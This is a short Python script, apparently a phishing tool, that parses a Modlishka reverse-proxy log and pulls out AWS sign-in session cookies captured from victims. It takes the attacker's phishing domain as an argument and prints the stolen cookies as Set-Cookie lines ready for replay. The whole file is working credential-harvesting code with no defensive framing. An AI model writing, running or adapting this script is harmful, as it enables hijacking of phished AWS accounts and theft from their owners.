#!/usr/bin/env python3

# Usage: ./parse_modlishka_aws_cookies.py modlishka.log myphishingdomain.com

import sys

phishing_domain = sys.argv[2]

with open(sys.argv[1], 'r') as f:
    creds_file = f.readlines()

for i in range(len(creds_file) - 2):
    current_line = creds_file[i].rstrip()
    next_line = creds_file[i+1].rstrip()
    next_next_line = creds_file[i+2].rstrip()
    if current_line == 'URL: https://signin.aws.amazon.com' and next_line == '======' and phishing_domain not in next_next_line and 'aws-creds' in next_next_line:
        parsed_next_next_line = 'Set-Cookie: ' + '\nSet-Cookie: '.join(next_next_line.split('####'))
        print('SIGNIN.AWS.AMAZON.COM COOKIES ({}):\n\n{}\n\n'.format(creds_file[i-6].rstrip(), parsed_next_next_line))